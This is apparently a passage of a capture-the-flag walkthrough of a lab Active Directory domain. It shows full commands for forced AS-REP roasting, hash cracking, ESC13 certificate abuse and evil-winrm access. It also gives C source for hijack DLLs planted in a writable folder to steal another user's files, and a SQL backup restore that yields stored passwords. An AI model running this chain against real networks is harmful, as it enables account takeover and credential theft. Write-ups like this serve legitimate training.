+<li><code>SeMachineAccountPrivilege = *S-1-5-11</code> assigns that right to Authenticated Users. We can&#x27;t sign off on creating computer accounts  until we know the domain&#x27;s machine account quota, though. </li>
+</ol>
+<p>Let&#x27;s grab and read <code>Registry.pol</code> while we&#x27;re here.</p>
+<pre><code class="language-bash">smbclient //10.1.156.144/SYSVOL -U &#x27;NORTHSTONE\c.mcgill%chuck102213&#x27;</code></pre>
+<pre><code class="language-bash">cd northstone.local
+cd Policies
+cd {31B2F340-016D-11D2-945F-00C04FB984F9}
+cd MACHINE
+get Registry.pol
+exit</code></pre>
+<p>We&#x27;re not going to use<code>cat</code> to open <code>Registry.pol</code> because it&#x27;s in binary and would be a mess. We&#x27;ll use this Python command to extract what&#x27;s readable:</p>
+<pre><code class="language-bash">python3 -c &#x27;import re; d=open(&quot;Registry.pol&quot;,&quot;rb&quot;).read(); print(&quot;\n&quot;.join(s.decode(&quot;utf-16le&quot;,&quot;replace&quot;) for s in re.findall(rb&quot;(?:[\x20-\x7e]\x00){4,}&quot;,d)))&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/registry-policy-efs.png" alt="Registry policy efs" loading="lazy"></figure>
+<p>We&#x27;re looking at EFS certificate policy data. There&#x27;s a certificate entry and provider name, but no password or foothold-worthy information. I think we&#x27;ve found what we can in <code>SYSVOL</code>.</p>
+<h2>Changing Tony's preauthentication setting</h2>
+<p>Let&#x27;s check AD object permissions</p>
+<pre><code class="language-bash">bloodyAD --host DC.northstone.local -d northstone.local -u c.mcgill -p &#x27;chuck102213&#x27; get writable --detail</code></pre>
+<p>Great find. We found through Chuck’s authenticated query that he can write <code>userAccountControl</code> on Tony Dalton’s account.</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/chuck-writable-uac.png" alt="Chuck writable uac" loading="lazy"></figure>
+<p>Our <code>GetNPUsers</code> Kerberos preauthentication check did show that Tony aka <code>t.dalton</code> requires Kerberos preauth, but combine this with Chuck&#x27;s <code>userAccountControl</code> writability, and we have a path to test.</p>
+<p>We&#x27;ll use Chuck’s permission to enable <code>DONT_REQ_PREAUTH</code> for Tony, then request an AS-REP for Tony.</p>
+<p>First, we record Tony&#x27;s current <code>userAccountControl</code>:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u c.mcgill -p &#x27;chuck102213&#x27; get object t.dalton --attr userAccountControl</code></pre>
+<p>Now we add the flag Chuck can write:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u c.mcgill -p &#x27;chuck102213&#x27; add uac t.dalton -f DONT_REQ_PREAUTH</code></pre>
+<p>And verify that we did it:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u c.mcgill -p &#x27;chuck102213&#x27; get object t.dalton --attr userAccountControl</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-preauth-change.png" alt="Tony preauth change" loading="lazy"></figure>
+<p>We added <code>DONT_REQ_PREAUTH</code> and Tony’s other two flags didn&#x27;t vanish.</p>
+<p>Time to request Tony&#x27;s AS-REP and save it:</p>
+<pre><code class="language-bash">impacket-GetNPUsers northstone.local/t.dalton -no-pass -dc-ip 10.1.156.144 -format hashcat -outputfile t.dalton.asrep</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-asrep-hash.png" alt="Tony asrep hash" loading="lazy"></figure>
+<p>We got a <code>$krb5asrep$23$</code> hash for <code>t.dalton</code>.</p>
+<p>Let&#x27;s run <code>rockyou</code> against Tony&#x27;s hash:</p>
+<pre><code class="language-bash">hashcat -m 18200 t.dalton.asrep /usr/share/wordlists/rockyou.txt</code></pre>
+<p>When it&#x27;s done, grab our new credential for Tony:</p>
+<pre><code class="language-bash">hashcat -m 18200 --show t.dalton.asrep</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-password-cracked.png" alt="Tony password cracked" loading="lazy"></figure>
+<p>Tony&#x27;s credentials: <code>t.dalton:123tonyd</code></p>
+<p>Let&#x27;s use <code>netexec</code> to make sure the password does authenticate as Tony:</p>
+<pre><code class="language-bash">nxc smb 10.1.156.144 -u t.dalton -p &#x27;123tonyd&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-smb-login.png" alt="Tony smb login" loading="lazy"></figure>
+<p>Tony&#x27;s credentials worked. Let&#x27;s restore the single account flag:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u c.mcgill -p &#x27;chuck102213&#x27; remove uac t.dalton -f DONT_REQ_PREAUTH</code></pre>
+<p>Now we make sure that Tony is back to <code>NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD</code>:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u c.mcgill -p &#x27;chuck102213&#x27; get object t.dalton --attr userAccountControl</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-preauth-restored.png" alt="Tony preauth restored" loading="lazy"></figure>
+<h2>Certificate enrollment and WinRM</h2>
+<p>Time to enumerate Tony&#x27;s group memberships:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u t.dalton -p &#x27;123tonyd&#x27; get membership t.dalton</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-group-memberships.png" alt="Tony group memberships" loading="lazy"></figure>
+<p>Tony is a member of Certificate Enrollment Users and Software Maintainers.</p>
+<p>Let&#x27;s enumerate AD CS:</p>
+<pre><code class="language-bash">certipy-ad find -u &#x27;t.dalton@northstone.local&#x27; -p &#x27;123tonyd&#x27; -dc-ip 10.1.156.144 -stdout -vulnerable</code></pre>
+<p>We found strong leads here.</p>
+<p>Here&#x27;s what Tony is allowed to request/can enroll:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/certificate-template-findings.png" alt="Certificate template findings" loading="lazy"></figure>
+<p>This shows the group link Certipy flags. We already know Tony is a member of <code>Certificate Enrollment Users</code>.</p>
+<p>Let&#x27;s check Tony&#x27;s WInRM access:</p>
+<pre><code class="language-bash">nxc winrm 10.1.156.144 -u t.dalton -p &#x27;123tonyd&#x27; -d northstone.local</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-winrm-denied.png" alt="Tony winrm denied" loading="lazy"></figure>
+<p>Not the path we&#x27;re taking.</p>
+<p>Let&#x27;s request a certificate for Tony courtesy of the templates we found with Certipy:</p>
+<pre><code class="language-bash">certipy-ad req -u &#x27;t.dalton@northstone.local&#x27; -p &#x27;123tonyd&#x27; -dc-ip 10.1.156.144 -target &#x27;DC.northstone.local&#x27; -target-ip 10.1.156.144 -ca &#x27;NORTHSTONE-CA&#x27; -template &#x27;TemporaryWinRM&#x27; -out &#x27;t.dalton-TemporaryWinRM.pfx&#x27;</code></pre>
+<p>Hmm. We hit a timeout. Netcat shows 135 and 445 are open, so we&#x27;ll try Certipy&#x27;s DOM enrollment method instead:</p>
+<pre><code class="language-bash">certipy-ad req -u &#x27;t.dalton@northstone.local&#x27; -p &#x27;123tonyd&#x27; -dc-ip 10.1.156.144 -target &#x27;DC.northstone.local&#x27; -target-ip 10.1.156.144 -ca &#x27;NORTHSTONE-CA&#x27; -template &#x27;TemporaryWinRM&#x27; -dcom -timeout 30 -out &#x27;t.dalton-TemporaryWinRM.pfx&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/temporary-winrm-certificate.png" alt="Temporary winrm certificate" loading="lazy"></figure>
+<p>Tony enrolled in the template. The certificate and private key are saved in <code>t.dalton-TemporaryWinRM.pfx</code>.</p>
+<p>Let&#x27;s use that certificate to authenticate and grab ourselves a Kerberos ticket:</p>
+<pre><code class="language-bash">certipy-ad auth -pfx &#x27;t.dalton-TemporaryWinRM.pfx&#x27; -dc-ip 10.1.156.144</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/certificate-auth-ticket.png" alt="Certificate auth ticket" loading="lazy"></figure>
+<p>We &quot;got hash&quot;. Sounds like an after school weed dealer.</p>
+<p>We&#x27;ll try WinRM with the ticket:</p>
+<pre><code class="language-bash">evil-winrm -i DC.northstone.local -r NORTHSTONE.LOCAL -K t.dalton.ccache</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/kerberos-kdc-error.png" alt="Kerberos kdc error" loading="lazy"></figure>
+<p>Not as bad as it looks. Just another obstacle to work with. The ticket was found, but Kali&#x27;s Kerberos config doesn&#x27;t know which KDC serves <code>NORTHSTONE.LOCAL</code>.</p>
+<p>The fix? We&#x27;ll create a config just for this environment in our <code>~/NorthStone</code> directory:</p>
+<pre><code class="language-bash">cat &gt; krb5-northstone.conf &lt;&lt;&#x27;EOF&#x27;
+[libdefaults]
+    default_realm = NORTHSTONE.LOCAL
+    dns_lookup_kdc = false
+
+[realms]
+    NORTHSTONE.LOCAL = {
+        kdc = 10.1.156.144
+    }
+
+[domain_realm]
+    .northstone.local = NORTHSTONE.LOCAL
+    northstone.local = NORTHSTONE.LOCAL
+EOF</code></pre>
+<p>Now we retry with the config and our ticket:</p>
+<pre><code class="language-bash">KRB5_CONFIG=&quot;$PWD/krb5-northstone.conf&quot; evil-winrm -i DC.northstone.local -r NORTHSTONE.LOCAL -K t.dalton.ccache</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-winrm-shell.png" alt="Tony winrm shell" loading="lazy"></figure>
+<p>We have a shell as Tony:</p>
+<pre><code class="language-powershell">whoami /all</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-temp-winrm-group.png" alt="Tony temp winrm group" loading="lazy"></figure>
+<p>We can confirm ESC13.</p>
+<p><code>whoami /all</code> shows <code>NORTHSTONE\TempWinRMAccess</code> in Tony’s current token despite it not being listed earlier when we queried the directory membership.</p>
+<h2>The scheduled DLL</h2>
+<p>I&#x27;m thinking the Software Maintainers group is our next move. Let&#x27;s list the application directories:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/windows-update-checker-directory.png" alt="Windows update checker directory" loading="lazy"></figure>
+<p>Pause for a moment. We should likely find the user flag.</p>
+<pre><code class="language-powershell">Get-ChildItem &#x27;C:\Users\t.dalton\Desktop&#x27; -Force</code></pre>
+<p>There&#x27;s an email file on Tony&#x27;s desktop that seems to be a test setup.</p>
+<p>Let&#x27;s find out:</p>
+<pre><code class="language-powershell">Get-Content &#x27;C:\Users\t.dalton\Desktop\WindowsUpdateChecker_Test_Setup.eml&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/windows-update-checker-setup.png" alt="Windows update checker setup" loading="lazy"></figure>
+<p>Well this gives us a promising lead to verify. Thanks, Carls.</p>
+<p>We&#x27;ll be looking for the scheduled task that runs <code>WindowsUpdateChecker</code> as <code>c.white</code>, as well as checking that the application uses a DLL from its directory. In his message, Carls does flip from “every two minutes” to “every 1 minute,” so we&#x27;ll have to verify what the timing loop is.</p>
+<p>Let&#x27;s verify the <code>WindowsUpdateChecker</code> directory:</p>
+<pre><code class="language-bash">Get-ChildItem &#x27;C:\Program Files\WindowsUpdateChecker&#x27; -Force</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/windows-update-checker-files.png" alt="Windows update checker files" loading="lazy"></figure>
+<p>Yes. It&#x27;s there alright. And it holds the executable and a <code>modules</code> subdirectory. Let&#x27;s see what <code>modules</code> beholds:</p>
+<pre><code class="language-bash">Get-ChildItem &#x27;C:\Program Files\WindowsUpdateChecker\modules&#x27; -Force
+icacls &#x27;C:\Program Files\WindowsUpdateChecker\modules&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/writable-module-directory.png" alt="Writable module directory" loading="lazy"></figure>
+<p>Hot permission finding alert: Tony has Modify (<code>M</code>) permission on the <code>modules</code> directory, including the ability to create or change files.</p>
+<p>Except that <code>modules</code> is empty, or so we think. Let&#x27;s grab the executable file and inspect it offline:</p>
+<pre><code class="language-powershell">download &#x27;C:\Program Files\WindowsUpdateChecker\WindowsUpdateChecker.exe&#x27;</code></pre>
+<p>We&#x27;ll leave our shell connected, and use another local terminal to examine the .exe:</p>
+<pre><code class="language-bash">strings -el WindowsUpdateChecker.exe | grep -Ei &#x27;modules|\.dll&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dll-path-in-executable.png" alt="Dll path in executable" loading="lazy"></figure>
+<p>We have our file path. This is starting to feel a lot like DLL loading, but we shall see.</p>
+<p>Still in our local terminal:</p>
+<pre><code class="language-bash">file WindowsUpdateChecker.exe</code></pre>
+<p>We have a 64-bit .NET assembly on our hands. Let&#x27;s take a look at lines of decompiled code surrounding the DLL reference:</p>
+<pre><code class="language-bash">DOTNET_ROOT=&quot;$HOME/.dotnet&quot; PATH=&quot;$HOME/.dotnet:$PATH&quot; ilspycmd WindowsUpdateChecker.exe | grep -n -C 12 -Ei &#x27;wuaclt\.dll|modules|LoadLibrary&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dll-load-code.png" alt="Dll load code" loading="lazy"></figure>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dll-load-code-continued.png" alt="Dll load code continued" loading="lazy"></figure>
+<p>The decompiled code tells us some important details:</p>
+<ol>
+<li><code>Main</code> checks for the existence of <code>C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll</code>.</li>
+<li>If it does exist, <code>LoadDLLSilent</code> uses <code>wuaclt.dll</code> to call Windows <code>LoadLibrary</code>.</li>
+<li>The code then looks up an export named <code>TestFunction</code>, but from what I see, the code doesn&#x27;t call <code>TestFunction</code>. The DLL&#x27;s initialization code can still run when loaded by <code>LoadLibrary</code>. </li>
+<li>The program then takes a 60 second nap (<code>sleep</code>).</li>
+</ol>
+<p>Paired with Tony&#x27;s <code>Modify</code> permission, this is shaping up to almost be a confirmed DLL-loading find.</p>
+<p>We&#x27;ll make a PoC DLL that, when it loads, will write the present account&#x27;s username to <code>C:\ProgramData\NorthStoneDllProof.txt</code>:</p>
+<pre><code class="language-bash">cat &gt; proof.c &lt;&lt;&#x27;EOF&#x27;
+#include &lt;windows.h&gt;
+
+__declspec(dllexport) void TestFunction(void) {}
+
+BOOL WINAPI DllMain(HINSTANCE dll, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        char user[256] = {0};
+        DWORD user_size = sizeof(user);
+
+        if (GetUserNameA(user, &amp;user_size)) {
+            HANDLE file = CreateFileA(
+                &quot;C:\\ProgramData\\NorthStoneDllProof.txt&quot;,
+                FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
+                OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
+            );
+            if (file != INVALID_HANDLE_VALUE) {
+                DWORD written;
+                WriteFile(file, user, lstrlenA(user), &amp;written, NULL);
+                WriteFile(file, &quot;\r\n&quot;, 2, &amp;written, NULL);
+                CloseHandle(file);
+            }
+        }
+    }
+    return TRUE;
+}
+EOF</code></pre>
+<p>Compile and confirm:</p>
+<pre><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o wuaclt.dll proof.c -ladvapi32
+file wuaclt.dll</code></pre>
+<p>Now we&#x27;ll use Evil-WinRM to change the writable module directory and upload it:</p>
+<pre><code class="language-bash">Set-Location &#x27;C:\Program Files\WindowsUpdateChecker\modules&#x27;</code></pre>
+<pre><code class="language-bash">upload wuaclt.dll</code></pre>
+<p>Once it&#x27;s done uploading, we wait the obligatory 60 seconds and check the marker:</p>
+<pre><code class="language-bash">Get-Content &#x27;C:\ProgramData\NorthStoneDllProof.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/dll-execution-proof.png" alt="Dll execution proof" loading="lazy"></figure>
+<p>Success. The uploaded DLL ran,  marking our present username <code>c.white</code> .</p>
+<p>I verified the DLL path with a second payload, then tested whether Tony could read <code>c.white</code>'s <code>user.txt</code>. Access was denied, so I built a DLL to copy the file while the scheduled application ran as Carol.</p>
+<pre><code class="language-bash">Get-Content &#x27;C:\Users\c.white\Desktop\user.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/tony-user-flag-access-denied.png" alt="Tony user flag access denied" loading="lazy"></figure>
+<p>We can&#x27;t read the flag as <code>t.dalton</code> aka Tony. Tony can see that <code>user.txt</code> exists like a mirage in the distance, but we need to be <code>c.white</code> to read it.</p>
+<p>The solution?</p>
+<p>Make the DLL read <code>c.white</code>’s <code>user.txt</code> and copy it to a location where Tony can see it. This script will have the DLL copy the file while running as <code>c.white</code>.</p>
+<p>Run this on your local terminal:</p>
+<pre><code class="language-bash">cat &gt; flag-copy.c &lt;&lt;&#x27;EOF&#x27;
+#include &lt;windows.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        CopyFileA(
+            &quot;C:\\Users\\c.white\\Desktop\\user.txt&quot;,
+            &quot;C:\\ProgramData\\NorthStoneUserFlag.txt&quot;,
+            FALSE
+        );
+    }
+    return TRUE;
+}
+
+__declspec(dllexport) void TestFunction(void) {}
+EOF
+x86_64-w64-mingw32-gcc -shared -o wuaclt-flag.dll flag-copy.c
+sha256sum wuaclt-flag.dll</code></pre>
+<p>Compiled successfully. Hashed and ready.</p>
+<p>Now we head back over to our WinRM prompt, and run:</p>
+<pre><code class="language-powershell">Set-Location &#x27;C:\Users\t.dalton\Documents&#x27;</code></pre>
+<pre><code class="language-powershell">upload /home/jenn/wuaclt-flag.dll</code></pre>
+<pre><code class="language-powershell">(Get-FileHash &#x27;.\wuaclt-flag.dll&#x27; -Algorithm SHA256).Hash</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/flag-dll-upload-hash.png" alt="Flag dll upload hash" loading="lazy"></figure>
+<p>The hashes align. The <code>flag-copy</code> DLL is officially chilling in Tony&#x27;s Documents folder.</p>
+<p>Let&#x27;s copy it into the application&#x27;s line of fire and verify that we did it accurately:</p>
+<pre><code class="language-powershell">Copy-Item &#x27;.\wuaclt-flag.dll&#x27; &#x27;C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll&#x27; -Force</code></pre>
+<pre><code class="language-powershell">(Get-FileHash &#x27;C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll&#x27; -Algorithm SHA256).Hash</code></pre>
+<p>Wait 60 seconds, and it&#x27;s launch time:</p>
+<pre><code class="language-powershell">Get-Content &#x27;C:\ProgramData\NorthStoneUserFlag.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/user-flag-redacted.png" alt="User access confirmed" loading="lazy"></figure>
+<p>That was a fun User Flag solve. Tony could list the filename, but access was denied when trying to read it. Shout out to the scheduled application that loaded our DLL as <code>c.white</code>, and the DLL that copied <code>user.txt</code> to <code>C:\ProgramData\NorthStoneUserFlag.txt</code> within Tony&#x27;s reach.</p>
+<h2>Carol's backup work</h2>
+<p>Onwards and upwards to root!</p>
+<p>Let&#x27;s map what <code>c.white</code> can do before we calculate a root route. We know the DLL ran as <code>c.white</code>, but we&#x27;ve yet to dig into her privileges.</p>
+<p>From your local terminal, we&#x27;ll use Tony&#x27;s creds to read <code>c.white</code>&#x27;s AD group memberships:</p>
+<pre><code class="language-bash">bloodyad --host DC.northstone.local -d northstone.local -u t.dalton -p &#x27;123tonyd&#x27; get membership c.white</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/carol-group-memberships.png" alt="Carol group memberships" loading="lazy"></figure>
+<p>Here&#x27;s the group membership rundown:  In addition to the standard user group, <code>c.white</code> is in Software Maintainers, IT Support, and Database Backup Operators.</p>
+<p>Let&#x27;s head back to Bloodhound and look at <code>C.WHITE@NORTHSTONE.LOCAL</code>&#x27;s Outbound Object Controls.</p>
+<p>Hmm. No Outbound again? We&#x27;re going to run the export again but as Tony.</p>
+<pre><code class="language-bash">bloodhound-python -u t.dalton -p &#x27;123tonyd&#x27; -d northstone.local -dc DC.northstone.local -ns 10.1.156.144 -c All --zip</code></pre>
+<p>A much better export process. We&#x27;ll ingest this alongside the already ingested ZIP.</p>
+<p>Still no Outbound, but not a bad group memberships list:</p>
+<figure class="north-stone-evidence"><img src="/images/north-stone/carol-bloodhound-groups.png" alt="Carol bloodhound groups" loading="lazy"></figure>
+<p>Let&#x27;s see Database Backup Operators Outbound Object Controls.</p>
+<p>Nope. No Outbound or Local Admin Privileges. Time to get creative.</p>
+<p>We&#x27;ll use <code>c.white</code>&#x27;s process token and the same scheduled DLL method to capture <code>whoami /all</code> and inspect groups and privileges that way.</p>
+<p>I used the same scheduled DLL route to capture Carol's token. The resulting <code>whoami /all</code> output confirmed her group memberships and provided sound reasoning to inspect her backup work.</p><figure class='north-stone-evidence'><img src='/images/north-stone/carol-token.png' alt='Carol token and group membership' loading='lazy'></figure>
+<p>The scheduled program runs as <code>northstone\c.white</code>, and we now know <code>c.white</code> belongs to Database Backup Operators, IT Support, and Software Maintainers.</p>
+<h3>Investigate <code>c.white</code>&#x27;s local work files</h3>
+<p>Clearly <code>c.white</code> performed backup database work. <code>SQLBACKUP</code> accepted her login and yet denied her access to the backup database.</p>
+<p>So what do we look for? Evidence of how she performed backup work.</p>
+<p>We&#x27;ll leverage the same DLL used to copy <code>user.txt</code> to copy <code>c.white</code>&#x27;s PowerShell history to  <code>C:\ProgramData</code> where we (aka Tony) can read it.</p>
+<p>In our local terminal:</p>
+<pre><code class="language-bash">cat &gt; history-copy.c &lt;&lt;&#x27;EOF&#x27;
+#include &lt;windows.h&gt;
+
+BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        CopyFileA(
+            &quot;C:\\Users\\c.white\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt&quot;,
+            &quot;C:\\ProgramData\\NorthStoneWhiteHistory.txt&quot;,
+            FALSE
+        );
+    }
+    return TRUE;
+}
+
+__declspec(dllexport) void TestFunction(void) {}
+EOF
+x86_64-w64-mingw32-gcc -shared -o wuaclt-history.dll history-copy.c
+sha256sum wuaclt-history.dll</code></pre>
+<p>Hashed and ready.</p>
+<p>Let&#x27;s head back over to Evil-WinRM to upload and verify it:</p>
+<pre><code class="language-powershell">upload /home/jenn/NorthStone/wuaclt-history.dll</code></pre>
+<p>And...</p>
+<pre><code class="language-powershell">(Get-FileHash &#x27;.\wuaclt-history.dll&#x27; -Algorithm SHA256).Hash</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/history-dll-upload-hash.png" alt="History dll upload hash" loading="lazy"></figure>
+<p>Hashes align. Now we&#x27;ll replace the DLL module:</p>
+<pre><code class="language-powershell">for ($i=0; $i -lt 120; $i++) { try { Copy-Item &#x27;.\wuaclt-history.dll&#x27; &#x27;C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll&#x27; -Force -ErrorAction Stop; &#x27;Copied&#x27;; break } catch { Start-Sleep -Milliseconds 500 } }</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/history-dll-installed-hash.png" alt="History dll installed hash" loading="lazy"></figure>
+<p><code>Copied</code> = success.</p>
+<p>Let&#x27;s verify the hash again.</p>
+<pre><code class="language-powershell">(Get-FileHash &#x27;C:\Program Files\WindowsUpdateChecker\modules\wuaclt.dll&#x27; -Algorithm SHA256).Hash</code></pre>
+<p>As long as it matches, we wait 60 seconds for a scheduled run to finish, then grab our PowerShell history:</p>
+<pre><code class="language-powershell">Get-Content &#x27;C:\ProgramData\NorthStoneWhiteHistory.txt&#x27;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/carol-powershell-history.png" alt="Carol powershell history" loading="lazy"></figure>
+<p>That is quite a finding in a PowerShell history.</p>
+<p><code>c.white</code> ran <code>sqlcmd</code> using the SQL login <code>backup_operator:BackupOps2026!</code>, then went on to look at <code>C:\BackupDB</code>.</p>
+<p><code>sqlcmd -S localhost</code> is the default SQL instance on Port 1433. We&#x27;ve been in the SQLBACKUP, so time to authenticate on the default instance.</p>
+<p>From a local terminal:</p>
+<pre><code class="language-bash">impacket-mssqlclient &#x27;backup_operator:BackupOps2026!@10.1.156.144&#x27; -port 1433</code></pre>
+<p>We&#x27;re in. Thanks, <code>c.white</code>.</p>
+<p>Another DLL run listed <code>C:\BackupDB</code> and copied the backup notes into a location Tony could read. The notes said the backup held three <code>auth_test_users</code> records. Glad we tested it because the live table gave us nothing.</p><figure class='north-stone-evidence'><img src='/images/north-stone/backup-directory-listing.png' alt='Backup directory listing' loading='lazy'></figure>
+<figure class="north-stone-evidence"><img src="/images/north-stone/backup-notes.png" alt="Backup notes" loading="lazy"></figure>
+<p>This is interesting. Remember when we found zero users in the database table? Me, too.</p>
+<p>This note says the <code>.bak</code> file holds three <code>auth_test_users</code> records. Let&#x27;s take a look at the backup.</p>
+<p>We&#x27;ll finally use our <code>SQL (backup_operator ...)&gt;</code> prompt. If we can identify the LogicalName and PhysicalName columns, we can do some reconstructing:</p>
+<pre><code class="language-sql">RESTORE FILELISTONLY FROM DISK = N&#x27;C:\BackupDB\NorthStoneDB.bak&#x27;;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/backup-logical-and-physical-files.png" alt="Backup logical and physical files" loading="lazy"></figure>
+<p>This might look like a mess, but it&#x27;s not.</p>
+<p>There are two SQL files in the database:</p>
+<ol>
+<li><code>D</code>: Logical name = <code>NorthStoneDB</code>, and holds database data</li>
+<li><code>L</code>: Logical name = <code>NorthStoneDB_log</code>, and it&#x27;s a transaction log. </li>
+</ol>
+<p>The <code>PhysicalName</code> values are old paths stored in the backup under what I&#x27;ve surmised to be the old company&#x27;s name, <code>NorthCareDB</code>.</p>
+<p>We are going to try to reconstruct the database from the backup and hope for the best.</p>
+<p>Let&#x27;s first check <code>backup_operator</code>&#x27;s server permissions:</p>
+<pre><code class="language-sql">SELECT IS_SRVROLEMEMBER(&#x27;dbcreator&#x27;) AS is_dbcreator, IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;) AS is_sysadmin;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/backup-operator-dbcreator.png" alt="Backup operator dbcreator" loading="lazy"></figure>
+<p>The <code>1</code> under <code>is_dbcreator</code> gives us a leg to stand on while trying to recreate the database.</p>
+<p>According to <a href="https://learn.microsoft.com/en-us/sql/relational-databases/backup-restore/restore-a-database-to-a-new-location-sql-server?view=sql-server-ver17">Microsoft&#x27;s documented method</a>, we can restore the backup as a separate database via <code>WITH MOVE</code>, which will direct the databases data and log files to new filenames. Makes sense to me.</p>
+<p>Let&#x27;s see where the <code>NorthStoneDB</code> files are stored:</p>
+<pre><code class="language-sql">SELECT name, physical_name FROM sys.master_files WHERE database_id = DB_ID(&#x27;NorthStoneDB&#x27;);</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/live-database-file-paths.png" alt="Live database file paths" loading="lazy"></figure>
+<p>We found where the data and log files live.</p>
+<p>Also under the guidance of <a href="https://learn.microsoft.com/en-us/sql/relational-databases/backup-restore/restore-a-database-to-a-new-location-sql-server?view=sql-server-ver17">Microsoft&#x27;s documentation</a>, we can now assign a name to the &quot;new&quot;/reconstructed database, and use <code>VERIFYONLY</code> to check the backup and our target file destination:</p>
+<pre><code class="language-sql">RESTORE VERIFYONLY FROM DISK = N&#x27;C:\BackupDB\NorthStoneDB.bak&#x27; WITH MOVE N&#x27;NorthStoneDB&#x27; TO N&#x27;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered.mdf&#x27;, MOVE N&#x27;NorthStoneDB_log&#x27; TO N&#x27;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered_log.ldf&#x27;;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/database-backup-verified.png" alt="Database backup verified" loading="lazy"></figure>
+<p>Woo! “<code>The backup set on file 1 is valid</code>” means we passed the SQL test. We can officially restore the database under its new name, <code>NorthStoneDB_Recovered</code>:</p>
+<pre><code class="language-sql">RESTORE DATABASE NorthStoneDB_Recovered FROM DISK = N&#x27;C:\BackupDB\NorthStoneDB.bak&#x27; WITH MOVE N&#x27;NorthStoneDB&#x27; TO N&#x27;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered.mdf&#x27;, MOVE N&#x27;NorthStoneDB_log&#x27; TO N&#x27;C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\DATA\NorthStoneDB_Recovered_log.ldf&#x27;;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/database-restored.png" alt="Database restored" loading="lazy"></figure>
+<p>Never underestimate the power of reading the official source guidance. We successfully resuscitated the database. All 353 pages of it. Hot damn.</p>
+<p>Let&#x27;s make sure the table is actually there and run a row count:</p>
+<pre><code class="language-sql">SELECT COUNT(*) AS recovered_users FROM NorthStoneDB_Recovered.dbo.auth_test_users;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/recovered-users-row-count.png" alt="Recovered users row count" loading="lazy"></figure>
+<p>There&#x27;s our 3 <code>auth_test_users</code>. The live table had zero rows, but this one has 3.</p>
+<p>Let&#x27;s see them:</p>
+<pre><code class="language-sql">SELECT id, Username, PasswordValue FROM NorthStoneDB_Recovered.dbo.auth_test_users ORDER BY id;</code></pre>
+<figure class="north-stone-evidence"><img src="/images/north-stone/recovered-auth-users.png" alt="Recovered auth users" loading="lazy"></figure>
+<p>Triple pwn special. Kind of feels like scoring a hat trick, but in ethical hacking. I played a lot of hockey as a kid.</p>
